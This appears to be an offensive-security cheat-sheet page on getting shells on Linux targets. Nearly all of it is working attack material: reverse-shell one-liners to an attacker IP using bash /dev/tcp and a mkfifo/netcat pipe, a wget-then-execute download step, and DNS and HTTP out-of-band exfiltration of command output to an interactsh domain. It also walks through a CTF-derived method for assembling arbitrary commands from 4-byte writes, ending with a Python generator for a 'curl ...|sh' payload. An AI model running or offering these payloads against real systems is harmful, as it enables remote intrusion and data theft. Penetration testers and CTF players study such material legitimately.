---
description: Specific tricks to get a shell for hacking Linux-based boxes
---

# Shells

## Reverse Shells

{% embed url="https://www.revshells.com/" %}

{% code title="Common reverse shells" %}
```shell
bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1
sh -i >& /dev/tcp/$YOUR_IP/1337 0>&1
bash -c 'bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/f
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/g
```
{% endcode %}

If you find a filter or have weird/short input, try simply downloading and then executing in two separate commands:

{% code title="Attacker" %}
```shell-session
$ mkdir http
$ nano http/shell.sh  # Can be index.html to do just `wget $YOUR_IP` on the victim
$ default listen http http
```
{% endcode %}

{% code title="Victim" %}
```shell-session
$ wget $YOUR_IP/shell.sh
$ sh shell.sh
```
{% endcode %}

With very limited communication available, you can try a few things:

```shell
sleep 10  # Should wait 10 seconds if code is executed
# DNS
interactsh-client -v  # Start as attacker (https://github.com/projectdiscovery/interactsh)
nslookup nftca6lpouq.oast.live  # Any DNS request will trigger in tool
bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.nftca6lpouq.oast.live/443'  # Exfiltrate command output
# HTTP
curl nftca6lpouq.oast.live
```

### RCE in 4 bytes

Sometimes you're limited in the length of the commands you can execute. There is a technique in bash to execute commands and save things to files, and eventually execute arbitrary code by just sending multiple 4-byte commands. The technique was a solution to a challenge by [Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2).&#x20;

The idea goes like this. Using file redirection with `>` you can save files with a name. Then we can slowly build out some letters to form a different command, and we can combine the letters using `dir`. This command just lists the current directory and places them all after each other separated by spaces. Using the `*` wildcard all files in the current directory will be inserted but in alphabetical order. This makes it quite hard to do much right now:

```shell-session
$ >dir  # Define dir command
$ >sl   # ls
$ >g\>  # >g
$ >ht-  # -th
$ *>v   # Execute dir command to file "v"
```

The `v` file now contains `g> ht- sl`. Reversed this would be `ls -th >g`, which allows us to list the files ordered by **time**. This way we don't have the restriction to have the command be in alphabetical order.&#x20;

```shell-session
$ >rev  # Define rev command
$ *v>x  # * wildcard matching only rev and v files, saving to x
```

Now `x` contains the desired `ls -th >g` which we can execute whenever we want. Now that the final file will be ordered by time, we can just write out the full payload character by character. Later we will create a file that has all of these separated by a newline, so we need to add a `\` at the end to escape the newline. Let's make `curl localhost:8000|sh;` for example:

```shell-session
$ >\;\\
$ >sh\\
$ >\|\\
$ >00\\
$ >80\\
$ >t:\\
$ >os\\
$ >lh\\
$ >ca\\
$ >lo\\
$ >\ \\
$ >rl\\
$ >cu\\
```

In an actual attack, you would send only one `\` at the end, but here in the interactive bash, we need to escape it ourselves. Executing the `ls -th` command we made earlier now, it gives us the desired command with backslashes to escape the newlines:

```shell-session
$ ls -th | cat
g
cu\
rl\
 \
lo\
ca\
lh\
os\
t:\
80\
00\
|\
sh\
;\
x
rev
v
ht-
g>
sl
dir
```

Finally, we can execute the `x` script to do the above command into a file called `g`. Then we can run the g script to actually run the payload that fetches a script from the `localhost:8000` address, of course, this can be any site of your own to host a malicious payload on.&#x20;

```shell-session
$ sh x  # ls -th >g
$ sh g  # Run final payload
```

To automatically run any payload you want, I made the following Python script to showcase the attack and create any payload:

{% code title="generate.py" %}
```python
import os
from time import sleep

COMMAND = "curl localhost:8000|sh;"  # Needs ; at the end for correct syntax


def is_normal_char(c):  # Safe characters that don't need to be escaped
    return c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,._+:@%/-"

def escape(c):
    if is_normal_char(c):
        return c
    else:
        return "\\" + c

def command_to_chunks(command):
    command = list(command)  # Allows .pop() method
    result = []
    while True:  # Go through whole command
        try:
            chunk = escape(command.pop())
            if len(chunk + escape(command[-1])) <= 2:  # Test potential extra character
                chunk = command.pop() + chunk  # Add another character because enough space
            
            result.append(f">{chunk}\\")
        except IndexError:  # If done
            break
    
    return result


payload = [
    # generate "g> ht- sl" to file "v"
    '>dir',  # Define dir command
    '>sl',   # ls
    '>g\>',  # >g
    '>ht-',  # -th
    '*>v',   # Execute dir command to file "v"

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',  # Define rev command
    '*v>x',  # * wildcard matching only rev and v files, saving to x
]

payload += command_to_chunks(COMMAND)

payload += [
    "sh x",  # ls -th >g
    "sh g",  # Run final payload
]

for c in payload:
    print(c)  # Send to target

# Optional: Execute proof-of-concept locally
# for c in payload:
#     sleep(0.1)  # Wait to make sure order is correct (no race conditions)
#     if len(c) <= 4:  # Max 4 bytes
#         os.system(c)
```
{% endcode %}
